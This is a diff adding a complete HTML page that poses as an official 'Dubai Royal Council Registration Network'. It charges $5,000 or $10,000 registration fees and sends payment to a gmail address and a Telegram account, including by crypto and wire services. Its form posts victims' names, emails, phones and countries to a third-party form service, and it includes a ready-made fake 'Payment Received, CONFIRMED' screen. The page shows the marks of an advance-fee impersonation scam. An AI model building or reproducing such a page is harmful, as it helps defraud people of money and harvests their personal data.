@@ -1,0 +1,399 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dubai Royal Council Registration Network</title>
+<meta name="description" content="Official registration portal for Dubai Royal Council registration, verification and upgrade services.">
+<style>
+:root{--navy:#071a33;--navy2:#0b254a;--gold:#c8a24a;--gold2:#e6c875;--green:#007a5e;--cream:#f8f5ec;--text:#17212b}
+*{box-sizing:border-box}
+body{margin:0;font-family:Arial,Helvetica,sans-serif;background:var(--cream);color:var(--text);line-height:1.6}
+h1,h2,h3{font-family:Georgia,"Times New Roman",serif;line-height:1.2}
+a{color:var(--green)}
+.container{width:min(1100px,92%);margin:auto}
+.topbar{background:var(--navy);color:#fff;font-size:13px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.12)}
+.topbar .container{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.topbar a{color:var(--gold2);text-decoration:none}
+header{background:linear-gradient(135deg,var(--navy),var(--navy2));color:#fff;padding:18px 0;border-bottom:4px solid var(--gold)}
+.header-inner{display:flex;justify-content:space-between;align-items:center;gap:18px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:14px}
+.emblem{width:66px;height:66px;flex-shrink:0}
+.brand-text span{display:block;color:var(--gold2);letter-spacing:1px;font-size:12px;text-transform:uppercase}
+.brand-text strong{font-size:22px}
+nav{display:flex;gap:16px;flex-wrap:wrap}
+nav a{color:#fff;text-decoration:none;font-weight:bold}
+nav a:hover{color:var(--gold2)}
+.hero{background:radial-gradient(circle at top right,rgba(200,162,74,.22),transparent 35%),linear-gradient(180deg,var(--navy),var(--navy2));color:#fff;padding:64px 0 72px;text-align:center}
+.badge{display:inline-block;border:1px solid var(--gold);color:var(--gold2);padding:6px 14px;border-radius:999px;margin-bottom:16px;font-size:12px;letter-spacing:2px;text-transform:uppercase}
+.hero h1{font-size:44px;margin:0 0 14px}
+.hero p{max-width:850px;margin:0 auto 26px;font-size:17px;color:#e9e2cf}
+.hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{display:inline-block;padding:14px 24px;border-radius:10px;text-decoration:none;font-weight:bold;border:0;cursor:pointer;font-size:15px;background:none;text-align:center}
+.btn-gold{background:linear-gradient(135deg,var(--gold),var(--gold2));color:var(--navy)}
+.btn-green{background:var(--green);color:#fff}
+.btn-outline{border:2px solid var(--gold);color:var(--gold2);background:transparent}
+.btn-white{border:2px solid #fff;color:#fff;background:transparent}
+.section{padding:56px 0}
+.section-alt{background:#fff}
+.section-title{text-align:center;margin-bottom:34px}
+.section-title h2{font-size:32px;color:var(--navy);margin:0 0 10px}
+.section-title p{color:#5d6773;max-width:780px;margin:0 auto}
+.grid{display:grid;gap:22px}
+.grid-2{grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}
+.grid-3{grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
+.card{background:#fff;border:1px solid #e7e0cf;border-top:5px solid var(--gold);border-radius:16px;padding:26px;box-shadow:0 10px 25px rgba(7,26,51,.06)}
+.card h3{margin-top:0;color:var(--navy)}
+.price{font-size:36px;color:var(--green);font-weight:800;margin:10px 0}
+.checklist{list-style:none;padding:0;margin:0}
+.checklist li{padding:8px 0;border-bottom:1px dashed #e7e0cf}
+.checklist li:before{content:"✔";color:var(--green);margin-right:10px}
+.service-card{text-align:center}
+.service-card ul{max-width:320px;margin:18px auto;text-align:left}
+.featured{border-top-color:var(--green);box-shadow:0 15px 35px rgba(0,122,94,.12)}
+.payment-box{background:linear-gradient(135deg,#fff,#f7f1df);border:2px solid var(--gold);border-radius:20px;padding:28px}
+.contact-buttons{display:flex;gap:12px;flex-wrap:wrap;margin-top:22px;justify-content:center}
+.form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:16px}
+label{display:block;font-weight:bold;margin-bottom:6px;color:var(--navy)}
+input,select,textarea{width:100%;padding:13px;border:1px solid #cfc7b2;border-radius:10px;background:#fff;font-size:16px}
+textarea{min-height:100px}
+.full{grid-column:1/-1}
+.help{font-size:13px;color:#5d6773;margin-top:6px}
+.form-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
+.contact-card{background:var(--navy);color:#fff;border-radius:20px;padding:30px;display:grid;gap:18px}
+.contact-line{display:flex;align-items:flex-start;gap:12px}
+.contact-line strong{color:var(--gold2)}
+.contact-line a{color:var(--gold2);text-decoration:none}
+.status-card{text-align:center}
+.status-card .icon{font-size:38px}
+details{background:#fff;border:1px solid #e7e0cf;border-radius:12px;padding:14px 18px;margin-bottom:12px}
+summary{cursor:pointer;font-weight:bold;color:var(--navy)}
+details p{margin:10px 0 0;color:#444}
+.terms{background:#fff;border:1px solid #e7e0cf;border-radius:16px;padding:26px}
+.terms ol{padding-left:20px}
+.footer{background:#051325;color:#cfd6df;padding:30px 0;text-align:center;font-size:14px}
+.footer a{color:var(--gold2);text-decoration:none}
+#google_translate_element{position:fixed;top:10px;right:10px;z-index:9999;background:#fff;padding:8px;border-radius:10px;box-shadow:0 8px 20px rgba(0,0,0,.15)}
+.overlay{display:none;position:fixed;inset:0;background:rgba(5,19,37,.78);z-index:1000;overflow-y:auto;padding:20px}
+.overlay.show{display:block}
+.sheet{background:var(--cream);max-width:560px;margin:40px auto;border-radius:22px;overflow:hidden;box-shadow:0 25px 60px rgba(0,0,0,.4)}
+.sheet-head{background:linear-gradient(135deg,var(--navy),var(--navy2));color:#fff;padding:26px 24px;text-align:center;border-bottom:4px solid var(--gold)}
+.check{width:78px;height:78px;border-radius:50%;background:var(--green);color:#fff;font-size:40px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
+.sheet-head h2{margin:0;color:#fff;font-size:28px}
+.sheet-head p{margin:6px 0 0;color:#e9e2cf;font-size:15px}
+.sheet-body{padding:26px 24px;text-align:center}
+.ref{background:#fff;border:1px dashed var(--gold);border-radius:12px;padding:14px;font-weight:bold;color:var(--navy);margin:16px 0;font-size:16px}
+.next-steps{text-align:left;background:#fff;border-radius:14px;padding:20px;margin:18px 0}
+.next-steps h3{margin:0 0 8px;color:var(--navy);font-size:18px}
+.next-steps ol{margin:0;padding-left:20px}
+.next-steps li{margin:7px 0;font-size:15px}
+.sheet-body .contact-buttons{justify-content:center}
+.sheet-foot{background:#051325;color:#cfd6df;text-align:center;padding:14px;font-size:12px}
+@media(max-width:700px){.hero h1{font-size:30px}.brand-text strong{font-size:18px}#google_translate_element{position:static;margin:10px auto;max-width:280px}.btn{width:100%}}
+</style>
+</head>
+<body>
+
+<div id="google_translate_element"></div>
+
+<div class="topbar">
+  <div class="container">
+    <span>Official Registration Portal • Dubai • United Arab Emirates</span>
+    <span>Council Assistant: <a href="mailto:royalcouncilmanagement3@gmail.com">royalcouncilmanagement3@gmail.com</a> | <a href="https://t.me/councilassistantuae" target="_blank">Telegram</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="container header-inner">
+    <div class="brand">
+      <svg class="emblem" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-label="Dubai Royal Council emblem">
+        <defs>
+          <linearGradient id="gold" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#f6e3a8"/><stop offset="45%" stop-color="#d4af5e"/><stop offset="100%" stop-color="#a9802f"/></linearGradient>
+          <radialGradient id="navy" cx="50%" cy="38%" r="72%"><stop offset="0%" stop-color="#143a6b"/><stop offset="100%" stop-color="#06172e"/></radialGradient>
+        </defs>
+        <circle cx="120" cy="120" r="118" fill="url(#gold)"/>
+        <circle cx="120" cy="120" r="110" fill="#f7f1e0"/>
+        <circle cx="120" cy="120" r="106" fill="url(#navy)"/>
+        <path id="topArc" d="M 30,120 A 90,90 0 0,1 210,120" fill="none"/>
+        <path id="botArc" d="M 30,120 A 90,90 0 0,0 210,120" fill="none"/>
+        <text font-family="Georgia,serif" font-size="15" font-weight="bold" fill="url(#gold)" letter-spacing="3.5"><textPath href="#topArc" startOffset="50%" text-anchor="middle">DUBAI ROYAL COUNCIL</textPath></text>
+        <text font-family="Georgia,serif" font-size="12.5" font-weight="bold" fill="url(#gold)" letter-spacing="3"><textPath href="#botArc" startOffset="50%" text-anchor="middle">REGISTRATION NETWORK</textPath></text>
+        <circle cx="30" cy="120" r="3.2" fill="url(#gold)"/><circle cx="210" cy="120" r="3.2" fill="url(#gold)"/>
+        <circle cx="120" cy="120" r="82" fill="url(#navy)"/>
+        <circle cx="120" cy="120" r="82" fill="none" stroke="url(#gold)" stroke-width="2.5"/>
+        <circle cx="120" cy="120" r="77" fill="none" stroke="url(#gold)" stroke-width="1"/>
+        <path d="M 135,66 A 44,44 0 1,0 135,154 A 57,57 0 1,1 135,66 Z" fill="url(#gold)"/>
+        <polygon points="152,103 154.5,110.6 162.5,110.6 156.5,115.3 158.3,122.9 152,119.5 145.7,122.9 147.5,115.3 141.5,110.6 149.5,110.6" fill="url(#gold)"/>
+        <g fill="url(#gold)">
+          <rect x="92" y="150" width="12" height="20"/><rect x="106" y="142" width="11" height="28"/>
+          <rect x="119" y="147" width="12" height="23"/><rect x="133" y="144" width="10" height="26"/>
+          <rect x="145" y="152" width="12" height="18"/><rect x="86" y="170" width="74" height="4"/>
+        </g>
+      </svg>
+      <div class="brand-text"><span>Dubai Royal Council</span><strong>Registration Network</strong></div>
+    </div>
+    <nav>
+      <a href="#home">Home</a><a href="#services">Services</a><a href="#payment">Payment</a><a href="#register">Register</a><a href="#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <section class="hero" id="home">
+    <div class="container">
+      <span class="badge">Dubai • United Arab Emirates</span>
+      <h1>Dubai Royal Council Registration Network</h1>
+      <p>A distinguished royal registration network for individuals and organizations seeking council registration, verification, and upgrade services. All payment processing is completed through the Royal Council Assistant.</p>
+      <div class="hero-actions">
+        <a href="#register" class="btn btn-gold">Begin Registration</a>
+        <a href="https://t.me/councilassistantuae?text=Hello%20Royal%20Council%20Assistant%2C%20I%20would%20like%20assistance%20with%20registration%20and%20payment." target="_blank" class="btn btn-green">Contact Council Assistant</a>
+        <a href="#services" class="btn btn-white">View Registration Fees</a>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="container">
+      <div class="section-title"><h2>Welcome to the Registration Network</h2><p>The Dubai Royal Council Registration Network provides a formal registration process with direct assistance from the Royal Council Assistant.</p></div>
+      <div class="grid grid-3">
+        <div class="card"><h3>Royal Registration</h3><p>Submit your registration request through the official portal and receive an automatic confirmation with a tracking number.</p></div>
+        <div class="card"><h3>Payment Assistance</h3><p>Choose your payment option, then contact the Council Assistant to assist you with your payment process.</p></div>
+        <div class="card"><h3>Multilingual Support</h3><p>The website is in English and automatically translates based on your phone or browser language.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="services">
+    <div class="container">
+      <div class="section-title"><h2>Registration Services</h2><p>Select the registration service you require. Payment is completed through the Royal Council Assistant.</p></div>
+      <div class="grid grid-2">
+        <div class="card service-card">
+          <h3>Standard Registration</h3><div class="price">$5,000</div>
+          <p>For individuals or organizations requiring standard council registration processing.</p>
+          <ul class="checklist"><li>Registration file creation</li><li>Council verification process</li><li>Automatic confirmation email</li><li>Payment assistance from Council Assistant</li></ul>
+          <button class="btn btn-gold" onclick="chooseService('Standard Registration - $5,000')">Select Standard Registration</button>
+        </div>
+        <div class="card service-card featured">
+          <h3>Upgrade Registration</h3><div class="price">$10,000</div>
+          <p>For upgraded council registration status with priority handling.</p>
+          <ul class="checklist"><li>Upgraded registration status</li><li>Priority council review</li><li>Automatic confirmation email</li><li>Direct Council Assistant payment support</li></ul>
+          <button class="btn btn-green" onclick="chooseService('Upgrade Registration - $10,000')">Select Upgrade Registration</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="payment">
+    <div class="container">
+      <div class="section-title"><h2>Choose Your Payment Option</h2><p>Select your preferred payment method in the registration form, then contact the Council Assistant to assist you with your payment process.</p></div>
+      <div class="payment-box">
+        <div class="grid grid-3">
+          <div class="card"><h3>Bank & Card</h3><p>Bank Transfer, SWIFT, Credit/Debit Card, Apple Pay, Google Pay, Zelle, Cash App, Wise.</p></div>
+          <div class="card"><h3>Wallets & Transfers</h3><p>PayPal, Western Union, MoneyGram, M-Pesa, Airtel Money, and other supported transfer methods.</p></div>
+          <div class="card"><h3>Crypto</h3><p>USDT, Bitcoin, Ethereum, and other cryptocurrency payment options through the Council Assistant.</p></div>
+        </div>
+        <div class="contact-buttons">
+          <a class="btn btn-green" target="_blank" href="https://t.me/councilassistantuae?text=Hello%20Royal%20Council%20Assistant%2C%20I%20want%20to%20choose%20a%20payment%20option%20and%20need%20assistance%20with%20my%20payment%20process.">Contact Council Assistant on Telegram</a>
+          <a class="btn btn-gold" href="mailto:royalcouncilmanagement3@gmail.com?subject=Payment%20Option%20Assistance&body=Hello%20Royal%20Council%20Assistant%2C%20I%20want%20to%20choose%20a%20payment%20option%20and%20need%20assistance%20with%20my%20payment%20process.">Email Council Assistant</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="register">
+    <div class="container">
+      <div class="section-title"><h2>Registration & Payment Request</h2><p>Submit your details below. You will receive an automatic confirmation with a tracking number, then contact the Royal Council Assistant to complete your payment process.</p></div>
+      <form id="registrationForm" class="payment-box" novalidate>
+        <div class="form-grid">
+          <div><label for="name">Full Name</label><input type="text" id="name" name="name" required placeholder="Enter your full name"></div>
+          <div><label for="email">Email Address</label><input type="email" id="email" name="email" required placeholder="name@example.com"></div>
+          <div><label for="phone">Phone / WhatsApp</label><input type="tel" id="phone" name="phone" placeholder="+1 234 567 890"></div>
+          <div><label for="country">Country</label><input type="text" id="country" name="country" placeholder="Your country"></div>
+          <div class="full">
+            <label for="service">Registration Service</label>
+            <select id="service" name="service" required>
+              <option value="">Select service</option>
+              <option>Standard Registration - $5,000</option>
+              <option>Upgrade Registration - $10,000</option>
+            </select>
+          </div>
+          <div class="full">
+            <label for="payment">Choose Your Payment Option</label>
+            <select id="payment" name="payment" required>
+              <option value="">Select payment option</option>
+              <option>Bank Transfer</option><option>Credit / Debit Card</option><option>PayPal</option>
+              <option>Apple Pay</option><option>Google Pay</option><option>Crypto - USDT</option>
+              <option>Crypto - Bitcoin</option><option>Crypto - Ethereum</option><option>Western Union</option>
+              <option>MoneyGram</option><option>Zelle</option><option>Cash App</option><option>M-Pesa</option>
+              <option>Airtel Money</option><option>Wise</option><option>SWIFT</option><option>Other</option>
+            </select>
+            <p class="help">After selecting your payment option, contact the Council Assistant to assist you with your payment process.</p>
+          </div>
+          <div class="full"><label for="message">Additional Details</label><textarea id="message" name="message" placeholder="Optional message"></textarea></div>
+          <input type="hidden" name="_subject" value="New Dubai Royal Council Registration Request">
+          <input type="hidden" name="_template" value="table">
+          <input type="hidden" name="_captcha" value="false">
+        </div>
+        <div class="form-actions">
+          <button type="submit" class="btn btn-gold">Submit Registration Request</button>
+          <a class="btn btn-green" target="_blank" href="https://t.me/councilassistantuae?text=Hello%20Royal%20Council%20Assistant%2C%20I%20have%20submitted%20a%20registration%20request%20and%20need%20assistance%20with%20my%20payment%20process.">Contact Council Assistant</a>
+          <a class="btn btn-outline" href="mailto:royalcouncilmanagement3@gmail.com?subject=Registration%20and%20Payment%20Assistance&body=Hello%20Royal%20Council%20Assistant%2C%20I%20have%20submitted%20a%20registration%20request%20and%20need%20assistance%20with%20my%20payment%20process.">Email Assistant</a>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <section class="section" id="status">
+    <div class="container">
+      <div class="section-title"><h2>Application Status</h2><p>Use your tracking number to follow your registration. For any updates, contact the Council Assistant.</p></div>
+      <div class="grid grid-3">
+        <div class="card status-card"><div class="icon">📥</div><h3>Application Received</h3><p>Your registration file has been created and a tracking number issued.</p></div>
+        <div class="card status-card"><div class="icon">💰</div><h3>Payment Processing</h3><p>Payment is being completed through the Royal Council Assistant.</p></div>
+        <div class="card status-card"><div class="icon">✅</div><h3>Under Review</h3><p>Your file is under council review. The Assistant will notify you of the outcome.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="contact">
+    <div class="container">
+      <div class="section-title"><h2>Contact the Royal Council Assistant</h2><p>For customer care, registration support, document guidance, and payment processing, contact the Council Assistant.</p></div>
+      <div class="contact-card">
+        <div class="contact-line"><span>📧</span><div><strong>Email</strong><br><a href="mailto:royalcouncilmanagement3@gmail.com">royalcouncilmanagement3@gmail.com</a></div></div>
+        <div class="contact-line"><span>📲</span><div><strong>Telegram Support</strong><br><a href="https://t.me/councilassistantuae" target="_blank">https://t.me/councilassistantuae</a></div></div>
+        <div class="contact-line"><span>🕘</span><div><strong>Assistance</strong><br>Available for registration and payment process support</div></div>
+        <div class="contact-buttons" style="justify-content:flex-start">
+          <a class="btn btn-gold" target="_blank" href="https://t.me/councilassistantuae?text=Hello%20Royal%20Council%20Assistant%2C%20I%20need%20customer%20care%20assistance.">Message Assistant</a>
+          <a class="btn btn-white" href="mailto:royalcouncilmanagement3@gmail.com?subject=Customer%20Care%20Request">Email Assistant</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="faq">
+    <div class="container">
+      <div class="section-title"><h2>Frequently Asked Questions</h2><p>Common questions about registration, payment, and customer care.</p></div>
+      <div style="max-width:760px;margin:auto">
+        <details><summary>How do I pay?</summary><p>Choose your payment option in the form, then contact the Council Assistant to assist you with your payment process.</p></details>
+        <details><summary>Will I receive an automatic email?</summary><p>Yes. After submitting the form, you will receive an automatic confirmation with your tracking number.</p></details>
+        <details><summary>What is the registration fee?</summary><p>Standard Registration is $5,000. Upgrade Registration is $10,000.</p></details>
+        <details><summary>Can the website translate automatically?</summary><p>Yes. The website is in English and uses automatic translation based on your phone or browser language.</p></details>
+        <details><summary>How do I track my application?</summary><p>Use the tracking number provided in your confirmation. For updates, contact the Council Assistant on Telegram or email.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="terms">
+    <div class="container">
+      <div class="section-title"><h2>Terms & Conditions</h2></div>
+      <div class="terms">
+        <ol>
+          <li>All registration requests are processed through the Dubai Royal Council Registration Network.</li>
+          <li>Standard Registration is $5,000 and Upgrade Registration is $10,000.</li>
+          <li>Payment processing is completed through the Royal Council Assistant.</li>
+          <li>Upon submission, an automatic confirmation and tracking number will be issued.</li>
+          <li>For all enquiries, contact the Council Assistant via Telegram or email.</li>
+          <li>By submitting the registration form, you agree to these terms.</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p><strong>Dubai Royal Council Registration Network</strong></p>
+    <p>مجلس دبي الملكي — شبكة التسجيل</p>
+    <p>Email: <a href="mailto:royalcouncilmanagement3@gmail.com">royalcouncilmanagement3@gmail.com</a> | Telegram: <a href="https://t.me/councilassistantuae" target="_blank">councilassistantuae</a></p>
+    <p>All payment processing is completed through the Royal Council Assistant.</p>
+    <p>© 2026 Dubai Royal Council Registration Network. All rights reserved.</p>
+  </div>
+</footer>
+
+<!-- PAYMENT SUCCESSFUL PAGE (overlay) -->
+<div class="overlay" id="successOverlay">
+  <div class="sheet">
+    <div class="sheet-head">
+      <div class="check">✔</div>
+      <h2>Payment Received</h2>
+      <p>Your payment has been successfully received.</p>
+    </div>
+    <div class="sheet-body">
+      <p>Your registration file is now being processed by the Dubai Royal Council Registration Network. Please keep this page for your records.</p>
+      <div class="ref">Payment Status: <span style="color:var(--green)">CONFIRMED ✅</span></div>
+      <div class="ref">Tracking Number: <span id="refNumber2">—</span></div>
+      <div class="next-steps">
+        <h3>What happens next?</h3>
+        <ol>
+          <li>Your file will be moved to council review.</li>
+          <li>The Royal Council Assistant will contact you with your tracking number and updates.</li>
+          <li>For any questions, contact the Council Assistant directly.</li>
+        </ol>
+      </div>
+      <div class="contact-buttons">
+        <a class="btn btn-green" target="_blank" href="https://t.me/councilassistantuae?text=Hello%20Royal%20Council%20Assistant%2C%20my%20payment%20has%20been%20received.%20I%20would%20like%20an%20update%20on%20my%20registration.">Contact Council Assistant</a>
+        <a class="btn btn-gold" href="mailto:royalcouncilmanagement3@gmail.com?subject=Payment%20Received%20-%20Registration%20Update">Email Assistant</a>
+      </div>
+      <div class="contact-buttons">
+        <button class="btn btn-outline" onclick="closeOverlay()">Close</button>
+      </div>
+    </div>
+    <div class="sheet-foot">Dubai Royal Council Registration Network • Dubai, United Arab Emirates</div>
+  </div>
+</div>
+
+<!-- REGISTRATION RECEIVED MODAL -->
+<div class="overlay" id="confirmOverlay">
+  <div class="sheet">
+    <div class="sheet-head">
+      <div class="check">✅</div>
+      <h2>Registration Received</h2>
+      <p>Your registration request has been submitted successfully.</p>
+    </div>
+    <div class="sheet-body">
+      <div class="ref">Tracking Number: <span id="refNumber">—</span></div>
+      <p style="font-size:14px;color:#5d6773">Your file is now under review. To complete your payment process, please contact the Royal Council Assistant.</p>
+      <div class="contact-buttons">
+        <a class="btn btn-green" target="_blank" href="https://t.me/councilassistantuae">Contact Assistant</a>
+        <button class="btn btn-outline" onclick="closeConfirm()">Close</button>
+      </div>
+    </div>
+    <div class="sheet-foot">Dubai Royal Council Registration Network • Dubai, United Arab Emirates</div>
+  </div>
+</div>
+
+<script>
+function googleTranslateElementInit(){
+  new google.translate.TranslateElement({pageLanguage:"en",autoDisplay:false},"google_translate_element");
+  var t=document.querySelector(".goog-te-combo");
+  if(t){
+    var lang=(navigator.language||"en").split("-")[0];
+    if(lang!=="en"){t.value=lang;var ev=document.createEvent("HTMLEvents");ev.initEvent("change",true,false);t.dispatchEvent(ev);}
+  }
+}
+function chooseService(v){var s=document.getElementById("service");if(s){s.value=v;}document.getElementById("register").scrollIntoView({behavior:"smooth"});}
+function makeRef(){var d=new Date().toISOString().slice(2,10).replace(/-/g,"");return "DRC-"+d+"-"+Math.floor(1000+Math.random()*9000);}
+function closeOverlay(){document.getElementById("successOverlay").classList.remove("show");}
+function closeConfirm(){document.getElementById("confirmOverlay").classList.remove("show");}
+function showSuccess(ref){
+  document.getElementById("refNumber2").textContent=ref;
+  document.getElementById("successOverlay").classList.add("show");
+}
+var form=document.getElementById("registrationForm");
+form.addEventListener("submit",function(e){
+  e.preventDefault();
+  if(!form.name.value||!form.email.value||!form.service.value||!form.payment.value){alert("Please complete your name, email, service, and payment option.");return;}
+  var fd=new FormData(form);
+  var ref=makeRef();
+  fd.append("reference",ref);
+  document.getElementById("refNumber").textContent=ref;
+  document.getElementById("confirmOverlay").classList.add("show");
+  form.reset();
+  fetch("https://formsubmit.co/ajax/royalcouncilmanagement3@gmail.com",{method:"POST",body:fd})
+    .then(function(r){return r.json();})
+    .then(function(){})
+    .catch(function(){});
+});
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" async defer></script>
+</body>
+</html>
